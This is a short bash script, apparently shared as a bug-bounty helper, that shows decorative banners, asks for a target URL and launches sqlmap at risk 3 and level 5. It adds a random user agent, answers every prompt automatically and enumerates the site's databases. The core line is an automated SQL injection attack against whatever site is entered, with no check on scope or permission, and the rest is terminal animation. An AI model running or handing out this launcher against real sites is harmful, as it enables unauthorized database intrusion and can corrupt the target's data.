figlet "SQL INJECT WITH 1337 STYLE" | lolcat
sleep 0.5
toilet -f mono12 -F metal by SaintDruG 
echo "Enter Target URL with Parameter:" | lolcat
read URL
sqlmap -u $URL --risk=3 --level=5 --dbs --random-agent --batch
echo "Injection Complete GL Bro, Try Harder!" | lolcat
sleep 0.5
echo "COPYRIGHTS ALL RIGHTS RESERVED - BLACK HAT ETHICAL HACKING" | lolcat
sleep 0.5
echo "---------------------------------------------------------------------" | lolcat
sleep 0.5
echo "Written by SaintDruG for Bug Bounty Purposes only for hackerone.com" | lolcat
xcowsay blackhatethicalhacking.com
# Description:
#Written by SaintDruG 
# This tool will start SQLMAP with Risk 3, Level 5 look for dbs using random agent without any 
#evasion techniques for quick scan and identification of issues, it will automatcially answer all 
#questions with Yes so it can go fast like lighting
# Matrix effect
echo "Exiting the Matrix for 5 seconds in:" | toilet --metal -f term -F border
sleep 1
echo "3" | toilet --gay -f term -F border
sleep 1
echo "2" | toilet --metal -f term -F border
sleep 1
echo "1" | toilet --gay -f term -F border
sleep 1

R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
B='\033[0;34m'
P='\033[0;35m'
C='\033[0;36m'
W='\033[1;37m'

for ((i=0; i<5; i++)); do
    echo -ne "${R}10 ${G}01 ${Y}11 ${B}00 ${P}01 ${C}10 ${W}00 ${G}11 ${P}01 ${B}10 ${Y}11 ${C}00\r"
    sleep 0.2
    echo -ne "${R}01 ${G}10 ${Y}00 ${B}11 ${P}10 ${C}01 ${W}11 ${G}00 ${P}10 ${B}01 ${Y}00 ${C}11\r"
    sleep 0.2
    echo -ne "${R}11 ${G}00 ${Y}10 ${B}01 ${P}00 ${C}11 ${W}01 ${G}10 ${P}00 ${B}11 ${Y}10 ${C}01\r"
    sleep 0.2
    echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
    sleep 0.2
done
echo -e "\033[2J\033[?25h" # reset screen
